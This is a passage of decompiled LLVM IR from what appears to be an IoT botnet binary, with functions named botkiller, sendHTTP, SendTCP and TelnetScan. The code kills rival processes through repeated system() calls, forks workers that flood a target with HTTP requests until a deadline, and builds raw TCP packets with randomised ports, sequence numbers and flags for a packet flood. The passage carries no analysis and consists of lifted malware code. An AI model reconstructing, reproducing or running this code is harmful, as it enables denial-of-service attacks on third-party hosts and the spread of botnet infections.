  %v6_fdf0 = call i32 @__libc_send(i32 %v2_fdd8, i32* bitcast ([447 x i8]* @global_var_1f508.887 to i32*), i32 425, i32 16384)
  %v1_fdf8 = icmp slt i32 %v6_fdf0, 0
  store i32 %storemerge511, i32* %r3.global-to-local, align 4
  br i1 %v1_fdf8, label %dec_label_pc_fe00, label %dec_label_pc_fe78

dec_label_pc_fe00:                                ; preds = %dec_label_pc_fd88
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  store i32 %v2_ea44, i32* %r3.global-to-local, align 4
  %v2_fe18 = load i32, i32* %v1_fdd8, align 4
  store i32 %v2_fe18, i32* %r3.global-to-local, align 4
  %v3_fe20 = call i32 @sclose(i32 %v2_fe18, i32 %v3_e904, i32 %v3_ea38)
  %v2_fe40 = add i32 %v2_ea44, 8
  %v3_fe48 = inttoptr i32 %v2_fe40 to i8*
  store i8 0, i8* %v3_fe48, align 4
  store i32 %v2_fe40, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v3_fe70 = add i32 %v2_ea44, 9
  %v4_fe70 = inttoptr i32 %v3_fe70 to i8*
  store i8 1, i8* %v4_fe70, align 1
  br label %dec_label_pc_ff2c

dec_label_pc_fe78:                                ; preds = %dec_label_pc_fd88
  %v2_fe94 = add i32 %v2_ea44, 8
  %v3_fe9c = add i32 %v2_ea44, 9
  %v4_fe9c = inttoptr i32 %v3_fe9c to i8*
  store i8 3, i8* %v4_fe9c, align 1
  store i32 %v3_ea38, i32* %r2.global-to-local, align 4
  %v2_febc = add i32 %v2_ea40, %v2_fc50
  store i32 %v2_febc, i32* %r3.global-to-local, align 4
  %v1_fec0 = inttoptr i32 %v2_febc to i32*
  %v2_fec0 = load i32, i32* %v1_fec0, align 4
  store i32 %v2_fec0, i32* %r3.global-to-local, align 4
  %v1_fec4 = add i32 %v2_fec0, 60
  store i32 %v1_fec4, i32* @r4, align 4
  %v2_fecc = call i32 @__GI_time(i32* null)
  store i32 %v2_fecc, i32* %r3.global-to-local, align 4
  %v0_fed4 = load i32, i32* @r4, align 4
  %v3_fed4 = icmp ult i32 %v0_fed4, %v2_fecc
  br i1 %v3_fed4, label %dec_label_pc_fedc, label %dec_label_pc_ff2c

dec_label_pc_fedc:                                ; preds = %dec_label_pc_fe78
  %v3_ff00 = inttoptr i32 %v2_fe94 to i8*
  store i8 0, i8* %v3_ff00, align 4
  store i32 %v2_fe94, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i8 1, i8* %v4_fe9c, align 1
  br label %dec_label_pc_ff2c

dec_label_pc_ff2c:                                ; preds = %dec_label_pc_f330, %dec_label_pc_f4dc, %dec_label_pc_f81c, %dec_label_pc_fc38, %dec_label_pc_fe78, %dec_label_pc_ea90, %dec_label_pc_ed88, %dec_label_pc_fe00, %dec_label_pc_fd5c, %dec_label_pc_fd08, %dec_label_pc_fc74, %dec_label_pc_fb68, %dec_label_pc_fb3c, %dec_label_pc_fa38, %dec_label_pc_f9e4, %dec_label_pc_f954, %dec_label_pc_f858, %dec_label_pc_f7f0, %dec_label_pc_f7c4, %dec_label_pc_f6f8, %dec_label_pc_f6a4, %dec_label_pc_f614, %dec_label_pc_f518, %dec_label_pc_f4b0, %dec_label_pc_f484, %dec_label_pc_f36c, %dec_label_pc_f2b8, %dec_label_pc_f198, %dec_label_pc_f120, %dec_label_pc_ef44, %dec_label_pc_eef4, %dec_label_pc_ed5c, %dec_label_pc_ed04, %dec_label_pc_fedc
  %v1_ff30 = add nuw nsw i32 %storemerge511, 1
  store i32 %v1_ff30, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v5_ff44 = icmp slt i32 %v1_ff30, 512
  br i1 %v5_ff44, label %dec_label_pc_ea2c, label %dec_label_pc_ea20

; uselistorder directives
  uselistorder i32 %v1_ff30, { 1, 0, 2 }
  uselistorder i32 %v2_fd24, { 1, 0, 2, 3 }
  uselistorder i32 %v2_fbb0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_f92c, { 1, 0 }
  uselistorder i32 %v2_f8e4, { 5, 2, 4, 3, 0, 1, 6, 7 }
  uselistorder i32 %v2_f80c, { 1, 0, 2 }
  uselistorder i32 %v3_f5ec, { 1, 0 }
  uselistorder i32 %v2_f5a4, { 5, 2, 4, 3, 0, 1, 6, 7 }
  uselistorder i32 %v2_f4cc, { 1, 0, 2 }
  uselistorder i32 %v2_f1b0, { 2, 1, 0 }
  uselistorder i32* %v1_efec, { 4, 3, 0, 1, 2, 5, 6, 7 }
  uselistorder i32 %storemerge610, { 1, 0 }
  uselistorder i32 %v0_ebdc, { 1, 0 }
  uselistorder i32 %v2_eb30, { 0, 3, 2, 1 }
  uselistorder i32 %v2_eb2c, { 1, 0, 2, 3 }
  uselistorder i8* %v2_eb04, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_eb00, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9 }
  uselistorder i8 %v2_eab0, { 1, 0 }
  uselistorder i32 %v0_ea74, { 1, 0 }
  uselistorder i32* %v1_ea4c, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v2_ea48, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v2_ea44, { 5, 6, 79, 80, 81, 83, 82, 74, 76, 75, 78, 77, 64, 65, 66, 68, 67, 70, 69, 71, 73, 72, 57, 58, 59, 56, 61, 60, 63, 62, 50, 51, 53, 52, 4, 55, 54, 43, 44, 45, 42, 47, 46, 49, 48, 36, 37, 39, 38, 3, 41, 40, 29, 30, 31, 26, 27, 28, 19, 20, 21, 23, 24, 22, 25, 32, 33, 35, 34, 8, 9, 10, 11, 13, 12, 16, 1, 2, 15, 14, 0, 18, 17, 7 }
  uselistorder i32 %v2_ea40, { 0, 1, 2, 3, 4, 5, 7, 8, 6 }
  uselistorder i32 %v3_ea38, { 57, 55, 56, 54, 53, 47, 52, 51, 49, 50, 48, 46, 45, 44, 43, 42, 41, 39, 40, 38, 37, 36, 35, 34, 33, 31, 32, 30, 29, 27, 28, 26, 24, 25, 23, 22, 20, 21, 19, 18, 17, 16, 9, 10, 8, 7, 6, 5, 4, 15, 14, 13, 12, 11, 3, 2, 1, 0 }
  uselistorder i32 %storemerge511, { 1, 5, 4, 6, 7, 8, 9, 10, 11, 14, 13, 12, 3, 2, 0 }
  uselistorder i32 %v2_fc50, { 3, 0, 4, 1, 2 }
  uselistorder i32 %v2_ef98, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v2_ede0, { 1, 0 }
  uselistorder i32 %v1_ea08, { 1, 0, 2 }
  uselistorder i32 %storemerge413, { 1, 0 }
  uselistorder i32 %v3_e904, { 3, 4, 7, 6, 5, 9, 0, 10, 8, 1, 13, 14, 15, 12, 2, 11 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-612, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 168, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 18, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 52, 49, 50, 53, 55, 54, 56, 57, 51, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 79, 76, 77, 80, 82, 81, 83, 84, 78, 85, 86, 87, 88, 89, 90, 93, 91, 92, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 107, 108, 106, 109, 110, 111, 112, 113, 114, 115, 116, 117, 191, 118, 119, 120, 121, 122, 123, 126, 124, 125, 127, 128, 129, 130, 131, 132, 133, 134, 136, 135, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 190, 181, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 189, 182, 183, 184, 186, 185, 188, 187 }
  uselistorder i32* %r2.global-to-local, { 107, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 70, 69, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 111, 108, 112, 109, 110 }
  uselistorder i32* bitcast ([447 x i8]* @global_var_1f508.887 to i32*), { 1, 0 }
  uselistorder i32 425, { 2, 3, 0, 1 }
  uselistorder i8* bitcast ([10 x i8*]* @global_var_1b3b8.37 to i8*), { 1, 0 }
  uselistorder i32 ptrtoint ([281 x i8*]* @global_var_2911c.879 to i32), { 2, 3, 0, 4, 1, 5 }
  uselistorder i32* bitcast ([3 x i8]* @global_var_1f4c4.877 to i32*), { 1, 0 }
  uselistorder i32 ptrtoint ([295 x i8*]* @global_var_290e4.875 to i32), { 2, 3, 0, 4, 1, 5 }
  uselistorder i8 3, { 1, 0, 2 }
  uselistorder i32 (i32)* @contains_fail, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sclose, { 4, 3, 2, 1, 0 }
  uselistorder i32 2560, { 1, 0 }
  uselistorder label %dec_label_pc_ff2c, { 33, 4, 7, 8, 9, 10, 3, 11, 12, 13, 14, 15, 16, 2, 17, 18, 19, 20, 21, 22, 1, 23, 24, 25, 0, 26, 27, 28, 29, 30, 6, 31, 32, 5 }
  uselistorder label %dec_label_pc_efac, { 1, 0 }
  uselistorder label %dec_label_pc_ef44, { 1, 0 }
  uselistorder label %dec_label_pc_ea90, { 1, 0 }
  uselistorder label %dec_label_pc_ea2c, { 1, 0 }
  uselistorder label %dec_label_pc_e94c, { 1, 0 }
}

define i32 @botkiller(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-100 = alloca i8*, align 4
  %v2_ff78 = ptrtoint i8** %stack_var_-100 to i32
  %v2_ffc4 = bitcast i8** %stack_var_-100 to i8*
  br label %dec_label_pc_ff7c

dec_label_pc_ff7c:                                ; preds = %dec_label_pc_10054, %entry
  br label %dec_label_pc_ff88

dec_label_pc_ff88:                                ; preds = %dec_label_pc_ff7c, %dec_label_pc_ff88
  %storemerge45 = phi i32 [ 0, %dec_label_pc_ff7c ], [ %v1_10040, %dec_label_pc_ff88 ]
  store i8* inttoptr (i32 1818848112 to i8*), i8** %stack_var_-100, align 4
  %v4_ffb4 = mul nuw nsw i32 %storemerge45, 4
  %v5_ffb4 = add i32 %v4_ffb4, ptrtoint ([162 x i8*]* @global_var_292f8.893 to i32)
  %v6_ffb4 = inttoptr i32 %v5_ffb4 to i32*
  %v7_ffb4 = load i32, i32* %v6_ffb4, align 4
  store i32 %v7_ffb4, i32* @r1, align 4
  %v3_ffc4 = call i32 @strcat(i8* %v2_ffc4, i32 %v7_ffb4)
  %v1_ffd0 = call i32 @__libc_system(i32 %v2_ff78)
  store i8* inttoptr (i32 1818848112 to i8*), i8** %stack_var_-100, align 4
  %v7_1000c = load i32, i32* %v6_ffb4, align 4
  store i32 %v7_1000c, i32* @r1, align 4
  %v3_1001c = call i32 @strcat(i8* %v2_ffc4, i32 %v7_1000c)
  store i32 ptrtoint (i32* @global_var_1f6e0.899 to i32), i32* @r1, align 4
  %v3_1002c = call i32 @strcat(i8* %v2_ffc4, i32 ptrtoint (i32* @global_var_1f6e0.899 to i32))
  %v1_10038 = call i32 @__libc_system(i32 %v2_ff78)
  %v1_10040 = add nuw nsw i32 %storemerge45, 1
  %v7_10050 = icmp slt i32 %v1_10040, 9
  br i1 %v7_10050, label %dec_label_pc_ff88, label %dec_label_pc_10054

dec_label_pc_10054:                               ; preds = %dec_label_pc_ff88
  %v1_10058 = call i32 @sleep(i32 5)
  br label %dec_label_pc_ff7c

; uselistorder directives
  uselistorder i32 %storemerge45, { 1, 0 }
  uselistorder i8** %stack_var_-100, { 3, 2, 0, 1 }
  uselistorder i32 (i32)* @__libc_system, { 1, 0 }
  uselistorder [3 x i8]* @global_var_1dbd0.58, { 1, 0 }
  uselistorder label %dec_label_pc_ff88, { 1, 0 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i8 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = sext i8 %arg3 to i32
  %stack_var_-557 = alloca i32, align 4
  %stack_var_-556 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_10074 = load i32, i32* @r4, align 4
  store i32 %v3_10074, i32* %stack_var_-20, align 4
  %v6_10074 = load i32, i32* @fp, align 4
  store i32 65660, i32* %stack_var_-4, align 4
  %v16_10074 = ptrtoint i32* %stack_var_-20 to i32
  %v2_10078 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10078, i32* @fp, align 4
  %v2_100ac = call i32 @__GI_time(i32* null)
  %v3_100b4 = load i32, i32* %stack_var_0, align 4
  %v2_100b8 = add i32 %v3_100b4, %v2_100ac
  %v2_100c0 = call i32 @random()
  %v2_100d0 = srem i32 %v2_100c0, 3
  %v3_100dc = mul nsw i32 %v2_100d0, 4
  %v2_100e4 = add i32 %v16_10074, -24
  %v2_100e8 = add i32 %v2_100e4, %v3_100dc
  %v1_100ec = inttoptr i32 %v2_100e8 to i32*
  %v2_100ec = load i32, i32* %v1_100ec, align 4
  store i32 %v2_100ec, i32* @r4, align 4
  %v3_100f0 = call i32 @random()
  %v2_10114 = ptrtoint i32* %stack_var_-556 to i32
  store i32 %v2_10114, i32* @r0, align 4
  %v3_10130 = call i32 @sprintf(i32 %v2_10114, i32 ptrtoint ([62 x i8]* @global_var_1f70c.910 to i32))
  %tmp28 = bitcast i32* %stack_var_-556 to i8*
  %v2_101ac = ptrtoint i32* %stack_var_-557 to i32
  %v5_1022835 = icmp sgt i32 %arg6, 0
  br i1 %v5_1022835, label %dec_label_pc_10140, label %dec_label_pc_1022c

dec_label_pc_10140:                               ; preds = %entry, %dec_label_pc_10210
  %storemerge236 = phi i32 [ %v1_10214, %dec_label_pc_10210 ], [ 0, %entry ]
  %v0_10140 = call i32 @__libc_fork()
  %v2_10148 = icmp eq i32 %v0_10140, 0
  br i1 %v2_10148, label %dec_label_pc_10210, label %dec_label_pc_101f0

dec_label_pc_10154:                               ; preds = %dec_label_pc_101f0
  %v5_10170 = call i32 @socket_connect(i32 %arg1, i8 %arg3, i32 %tmp)
  %v2_10180 = icmp eq i32 %v5_10170, 0
  br i1 %v2_10180, label %dec_label_pc_101f0, label %dec_label_pc_10188

dec_label_pc_10188:                               ; preds = %dec_label_pc_10154
  %v3_10190 = call i32 @strlen(i8* %tmp28)
  store i32 %v3_10190, i32* @r2, align 4
  %v3_101a4 = call i32 @__libc_write(i32 %v5_10170, i32* nonnull %stack_var_-556)
  store i32 %v2_101ac, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_101bc = call i32 @__libc_read(i32 %v5_10170)
  %v1_101c4 = call i32 @__libc_close(i32 %v5_10170)
  %v3_101d0 = call i32 @strlen(i8* %tmp28)
  store i32 %v3_101d0, i32* @r2, align 4
  %v3_101e4 = call i32 @__libc_write(i32 %v5_10170, i32* nonnull %stack_var_-556)
  %v1_101ec = call i32 @__libc_close(i32 %v5_10170)
  br label %dec_label_pc_101f0

dec_label_pc_101f0:                               ; preds = %dec_label_pc_10154, %dec_label_pc_10188, %dec_label_pc_10140
  %v2_101f4 = call i32 @__GI_time(i32* null)
  %v5_10204 = icmp slt i32 %v2_101f4, %v2_100b8
  br i1 %v5_10204, label %dec_label_pc_10154, label %dec_label_pc_10208

dec_label_pc_10208:                               ; preds = %dec_label_pc_101f0
  %v1_1020c = call i32 @__GI_exit(i32 1)
  br label %dec_label_pc_10210

dec_label_pc_10210:                               ; preds = %dec_label_pc_10140, %dec_label_pc_10208
  %v12_102305 = phi i32 [ 0, %dec_label_pc_10140 ], [ %v1_1020c, %dec_label_pc_10208 ]
  %v1_10214 = add nuw nsw i32 %storemerge236, 1
  %v5_10228 = icmp slt i32 %v1_10214, %arg6
  br i1 %v5_10228, label %dec_label_pc_10140, label %dec_label_pc_1022c

dec_label_pc_1022c:                               ; preds = %dec_label_pc_10210, %entry
  %v12_10230.lcssa = phi i32 [ %v3_10130, %entry ], [ %v12_102305, %dec_label_pc_10210 ]
  %v2_10230 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_10230, i32* @r4, align 4
  store i32 %v6_10074, i32* @fp, align 4
  ret i32 %v12_10230.lcssa

; uselistorder directives
  uselistorder i32 %v1_10214, { 1, 0 }
  uselistorder i32 %v5_10170, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_10210, { 1, 0 }
  uselistorder label %dec_label_pc_101f0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10140, { 1, 0 }
}

define i32 @SendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_10244 = load i32, i32* @r4, align 4
  %v6_10244 = load i32, i32* @fp, align 4
  store i32 66124, i32* %stack_var_-4, align 4
  %v2_10248 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10248, i32* @fp, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_10284 = icmp eq i32 %arg2, 0
  br i1 %v2_10284, label %dec_label_pc_1028c, label %dec_label_pc_102ac

dec_label_pc_1028c:                               ; preds = %entry
  %v0_1028c = call i32 @rand_cmwc()
  %v3_10294 = mul i32 %v0_1028c, 65536
  store i32 %v3_10294, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_102d0

dec_label_pc_102ac:                               ; preds = %entry
  %v3_102b4 = urem i32 %arg2, 65536
  store i32 %v3_102b4, i32* %r3.global-to-local, align 4
  %v1_102bc = call i32 @htons(i32 %v3_102b4)
  br label %dec_label_pc_102d0

dec_label_pc_102d0:                               ; preds = %dec_label_pc_1028c, %dec_label_pc_102ac
  %v2_102d4 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_102d4, i32* %r3.global-to-local, align 4
  %v3_102e0 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-60)
  store i32 %v3_102e0, i32* %r3.global-to-local, align 4
  %v2_102e8 = icmp eq i32 %v3_102e0, 0
  br i1 %v2_102e8, label %dec_label_pc_102f4, label %dec_label_pc_10888

dec_label_pc_102f4:                               ; preds = %dec_label_pc_102d0
  %v2_102f4 = ptrtoint i32* %stack_var_-64 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_10318 = call i32 @socket()
  store i32 %v0_10318, i32* %r3.global-to-local, align 4
  %v2_10328 = icmp eq i32 %v0_10318, 0
  br i1 %v2_10328, label %dec_label_pc_10888, label %dec_label_pc_10334

dec_label_pc_10334:                               ; preds = %dec_label_pc_102f4
  store i32 1, i32* %stack_var_-68, align 4
  %v2_1033c = ptrtoint i32* %stack_var_-68 to i32
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_1033c, i32* %r3.global-to-local, align 4
  %v6_10358 = call i32 @__GI_setsockopt(i32 %v0_10318, i32 0, i32 3, i32* nonnull %stack_var_-68, i32 4)
  store i32 %v6_10358, i32* %r3.global-to-local, align 4
  %v1_10360 = icmp slt i32 %v6_10358, 0
  br i1 %v1_10360, label %dec_label_pc_10888, label %dec_label_pc_1036c

dec_label_pc_1036c:                               ; preds = %dec_label_pc_10334
  store i32 %arg7, i32* %r3.global-to-local, align 4
  %v2_10370 = icmp eq i32 %arg7, 0
  br i1 %v2_10370, label %dec_label_pc_1039c, label %dec_label_pc_10384

dec_label_pc_10384:                               ; preds = %dec_label_pc_1036c
  %v1_10388 = sub i32 32, %arg7
  store i32 %v1_10388, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_10394 = shl i32 -1, %v1_10388
  br label %dec_label_pc_1039c

dec_label_pc_1039c:                               ; preds = %dec_label_pc_1036c, %dec_label_pc_10384
  %storemerge10 = phi i32 [ %v1_10394, %dec_label_pc_10384 ], [ 0, %dec_label_pc_1036c ]
  %v3_1039c = load i32, i32* %stack_var_0, align 4
  %v1_103a0 = add i32 %v3_1039c, 40
  %v1_103b0 = add i32 %v3_1039c, 46
  %v3_103b4 = and i32 %v1_103b0, -4
  %v1_103bc = load i32, i32* @sp, align 4
  %v2_103bc = sub i32 %v1_103bc, %v3_103b4
  %v1_103cc = add i32 %v2_103bc, 11
  %v3_103d0 = and i32 %v1_103cc, -4
  store i32 %v3_103d0, i32* %r2.global-to-local, align 4
  %v1_103f0 = add i32 %v3_103d0, 20
  store i32 %v1_103f0, i32* %r3.global-to-local, align 4
  %v5_103f4 = inttoptr i32 %v1_103f0 to i8*
  %v3_103f8 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_103f8, i32* @r4, align 4
  %v1_10400 = call i32 @TelnetScan(i32 %storemerge10)
  store i32 %v1_10400, i32* %r3.global-to-local, align 4
  %v1_1040c = call i32 @htonl(i32 %v1_10400)
  store i32 %v1_1040c, i32* %r2.global-to-local, align 4
  %v3_10414 = load i32, i32* %stack_var_0, align 4
  %v1_10418 = add i32 %v3_10414, 20
  %v1_1041c = load i32, i32* @sp, align 4
  %v2_1041c = inttoptr i32 %v1_1041c to i32*
  store i32 %v1_10418, i32* %v2_1041c, align 4
  %v0_10424 = load i32, i32* @r4, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v4_1042c = inttoptr i32 %v3_103d0 to i8*
  %v5_1042c = call i32 @makeIPPacket(i8* %v4_1042c, i32 %v0_10424, i32 %v1_1040c, i32 6)
  %v0_10430 = call i32 @rand_cmwc()
  %v3_1043c = urem i32 %v0_10430, 65536
  store i32 %v3_1043c, i32* %r3.global-to-local, align 4
  store i32 %v1_103f0, i32* %r2.global-to-local, align 4
  %v1_10444 = trunc i32 %v0_10430 to i8
  store i8 %v1_10444, i8* %v5_103f4, align 4
  %v0_10448 = load i32, i32* %r3.global-to-local, align 4
  %v3_10448 = sdiv i32 %v0_10448, 256
  store i32 %v3_10448, i32* %r3.global-to-local, align 4
  %v1_1044c = trunc i32 %v3_10448 to i8
  %v2_1044c = load i32, i32* %r2.global-to-local, align 4
  %v3_1044c = add i32 %v2_1044c, 1
  %v4_1044c = inttoptr i32 %v3_1044c to i8*
  store i8 %v1_1044c, i8* %v4_1044c, align 1
  %v0_10450 = call i32 @rand_cmwc()
  %v2_1045c = add i32 %v3_103d0, 24
  %v3_1045c = inttoptr i32 %v2_1045c to i32*
  store i32 %v0_10450, i32* %v3_1045c, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_10468 = add i32 %v3_103d0, 28
  %v3_10468 = inttoptr i32 %v2_10468 to i32*
  store i32 0, i32* %v3_10468, align 4
  store i32 %v1_103f0, i32* %r2.global-to-local, align 4
  %v1_10470 = add i32 %v3_103d0, 32
  %v2_10470 = inttoptr i32 %v1_10470 to i8*
  %v3_10470 = load i8, i8* %v2_10470, align 4
  %v1_1047c = urem i8 %v3_10470, 16
  %v1_10480 = or i8 %v1_1047c, 80
  store i8 %v1_10480, i8* %v2_10470, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1f74c.912 to i32), i32* @r1, align 4
  %v3_1049c = inttoptr i32 %arg4 to i8*
  %v4_1049c = call i32 @__GI_strcoll(i8* %v3_1049c, i32 ptrtoint ([4 x i8]* @global_var_1f74c.912 to i32))
  store i32 %v4_1049c, i32* %r3.global-to-local, align 4
  %v2_104a4 = icmp eq i32 %v4_1049c, 0
  br i1 %v2_104a4, label %dec_label_pc_104ac, label %dec_label_pc_10500

dec_label_pc_104ac:                               ; preds = %dec_label_pc_1039c
  store i32 %v1_103f0, i32* %r2.global-to-local, align 4
  %v1_104b0 = add i32 %v3_103d0, 33
  %v2_104b0 = inttoptr i32 %v1_104b0 to i8*
  %v3_104b0 = load i8, i8* %v2_104b0, align 1
  %v4_104b0 = zext i8 %v3_104b0 to i32
  %v1_104b4 = or i32 %v4_104b0, 2
  store i32 %v1_104b4, i32* %r3.global-to-local, align 4
  %v1_104b8 = trunc i32 %v1_104b4 to i8
  store i8 %v1_104b8, i8* %v2_104b0, align 1
  store i32 %v1_103f0, i32* %r2.global-to-local, align 4
  %v3_104c0 = load i8, i8* %v2_104b0, align 1
  %v4_104c0 = zext i8 %v3_104c0 to i32
  %v1_104c4 = or i32 %v4_104c0, 4
  store i32 %v1_104c4, i32* %r3.global-to-local, align 4
  %v1_104c8 = trunc i32 %v1_104c4 to i8
  store i8 %v1_104c8, i8* %v2_104b0, align 1
  store i32 %v1_103f0, i32* %r2.global-to-local, align 4
  %v3_104d0 = load i8, i8* %v2_104b0, align 1
  %v4_104d0 = zext i8 %v3_104d0 to i32
  %v1_104d4 = or i32 %v4_104d0, 1
  store i32 %v1_104d4, i32* %r3.global-to-local, align 4
  %v1_104d8 = trunc i32 %v1_104d4 to i8
  store i8 %v1_104d8, i8* %v2_104b0, align 1
  store i32 %v1_103f0, i32* %r2.global-to-local, align 4
  %v3_104e0 = load i8, i8* %v2_104b0, align 1
  %v4_104e0 = zext i8 %v3_104e0 to i32
  %v1_104e4 = or i32 %v4_104e0, 16
  store i32 %v1_104e4, i32* %r3.global-to-local, align 4
  %v1_104e8 = trunc i32 %v1_104e4 to i8
  store i8 %v1_104e8, i8* %v2_104b0, align 1
  store i32 %v1_103f0, i32* %r2.global-to-local, align 4
  %v3_104f0 = load i8, i8* %v2_104b0, align 1
  %v4_104f0 = zext i8 %v3_104f0 to i32
  %v1_104f4 = or i32 %v4_104f0, 8
  store i32 %v1_104f4, i32* %r3.global-to-local, align 4
  %v1_104f8 = trunc i32 %v1_104f4 to i8
  store i8 %v1_104f8, i8* %v2_104b0, align 1
  br label %dec_label_pc_10628

dec_label_pc_10500:                               ; preds = %dec_label_pc_1039c
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg4, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1f750.914 to i32), i32* @r1, align 4
  %v2_1050c = call i32 @__GI_strtok(i32 %arg4, i32 ptrtoint (i32* @global_var_1f750.914 to i32))
  store i32 %v2_1050c, i32* %r3.global-to-local, align 4
  %v2_1062020 = icmp eq i32 %v2_1050c, 0
  br i1 %v2_1062020, label %dec_label_pc_10628, label %dec_label_pc_1051c.lr.ph

dec_label_pc_1051c.lr.ph:                         ; preds = %dec_label_pc_10500
  %v1_1053c = add i32 %v3_103d0, 33
  %v2_1053c = inttoptr i32 %v1_1053c to i8*
  br label %dec_label_pc_1051c

dec_label_pc_1051c:                               ; preds = %dec_label_pc_1051c.lr.ph, %dec_label_pc_10608
  %storemerge1421 = phi i32 [ %v2_1050c, %dec_label_pc_1051c.lr.ph ], [ %v2_10610, %dec_label_pc_10608 ]
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1f754.916 to i32), i32* @r1, align 4
  %v3_10528 = inttoptr i32 %storemerge1421 to i8*
  %v4_10528 = call i32 @__GI_strcoll(i8* %v3_10528, i32 ptrtoint ([4 x i8]* @global_var_1f754.916 to i32))
  store i32 %v4_10528, i32* %r3.global-to-local, align 4
  %v2_10530 = icmp eq i32 %v4_10528, 0
  br i1 %v2_10530, label %dec_label_pc_10538, label %dec_label_pc_1054c

dec_label_pc_10538:                               ; preds = %dec_label_pc_1051c
  store i32 %v1_103f0, i32* %r2.global-to-local, align 4
  %v3_1053c = load i8, i8* %v2_1053c, align 1
  %v4_1053c = zext i8 %v3_1053c to i32
  %v1_10540 = or i32 %v4_1053c, 2
  store i32 %v1_10540, i32* %r3.global-to-local, align 4
  %v1_10544 = trunc i32 %v1_10540 to i8
  store i8 %v1_10544, i8* %v2_1053c, align 1
  br label %dec_label_pc_10608

dec_label_pc_1054c:                               ; preds = %dec_label_pc_1051c
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1f758.918 to i32), i32* @r1, align 4
  %v4_10558 = call i32 @__GI_strcoll(i8* %v3_10528, i32 ptrtoint ([4 x i8]* @global_var_1f758.918 to i32))
  store i32 %v4_10558, i32* %r3.global-to-local, align 4
